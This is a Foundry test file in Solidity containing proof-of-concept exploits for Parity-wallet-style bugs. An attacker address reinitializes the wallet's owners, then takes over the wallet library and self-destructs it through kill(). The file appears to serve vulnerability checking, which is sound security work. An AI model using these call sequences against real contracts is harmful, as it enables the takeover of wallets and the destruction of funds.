// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/parity_wallet_bug_1.sol";

contract WalletTest is Test {
    Wallet wallet;
    address[] owners;
    address attacker = address(0xbad);
    address owner1 = address(0x1);
    address owner2 = address(0x2);
    uint256 requiredConfirmations = 2;
    uint256 dailyLimit = 1 ether;

    function setUp() public {
        owners.push(owner1);
        owners.push(owner2);
        wallet = new Wallet(owners, requiredConfirmations, dailyLimit);
    }

    function testReinitializationVulnerability() public {
        console2.log("\n--- BEFORE-TRIGGER STATE ---");
        console2.log("Owner1 status:", wallet.isOwner(owner1) ? "owner" : "NOT owner");
        console2.log("Owner2 status:", wallet.isOwner(owner2) ? "owner" : "NOT owner");
        console2.log("Attacker status:", wallet.isOwner(attacker) ? "owner" : "NOT owner");

        console2.log("\n--- TRIGGERING REINITIALIZATION ATTACK ---");
        vm.prank(attacker);
        address[] memory newOwners = new address[](1);
        newOwners[0] = attacker;
        
        // Execute attack via delegatecall
        (bool success,) = address(wallet).call(
            abi.encodeWithSignature(
                "initWallet(address[],uint256,uint256)",
                newOwners,
                1,
                dailyLimit
            )
        );
        console2.log("Delegate call result:", success ? "success" : "failed");
        
        console2.log("\n--- AFTER-TRIGGER STATE ---");
        console2.log("Owner1 status:", wallet.isOwner(owner1) ? "owner" : "NOT owner");
        console2.log("Owner2 status:", wallet.isOwner(owner2) ? "owner" : "NOT owner");
        console2.log("Attacker status:", wallet.isOwner(attacker) ? "owner" : "NOT owner");

        // Final vulnerability check
        bool vulnerable = wallet.isOwner(owner1) && 
                          wallet.isOwner(owner2) && 
                          wallet.isOwner(attacker) && 
                          success;
                          
        if (vulnerable) {
            console2.log("Vulnerability Exists: Reinitialization via delegatecall modified owner mappings");
        } else {
            console2.log("Vulnerability not Exist: Failed to add attacker while preserving all original owners");
        }
    }

    function testLibraryReinitializationVulnerability() public {
        // Get wallet library address
        address walletLibrary;
        assembly {
            walletLibrary := sload(0)
        }
        console2.log("\n--- BEFORE-TRIGGER STATE ---");
        console2.log("Library address:", walletLibrary);

        console2.log("\n--- TRIGGERING LIBRARY INITIALIZATION ---");
        vm.prank(attacker);
        address[] memory newOwners = new address[](1);
        newOwners[0] = attacker;
        
        (bool success,) = walletLibrary.call(
            abi.encodeWithSignature(
                "initMultiowned(address[],uint256)",
                newOwners,
                1
            )
        );
        console2.log("Initialization result:", success ? "success" : "failed");
        
        console2.log("\n--- TRIGGERING LIBRARY DESTRUCTION ---");
        vm.prank(attacker);
        (bool killSuccess,) = walletLibrary.call(
            abi.encodeWithSignature("kill(address)", attacker)
        );
        console2.log("Destroy result:", killSuccess ? "success" : "failed");

        // Final vulnerability check
        if (success && killSuccess) {
            console2.log("Vulnerability Exists: Attacker successfully reinitialized and destroyed library");
        } else {
            console2.log("Vulnerability not Exist: Failed to reinitialize or destroy library");
        }
    }
}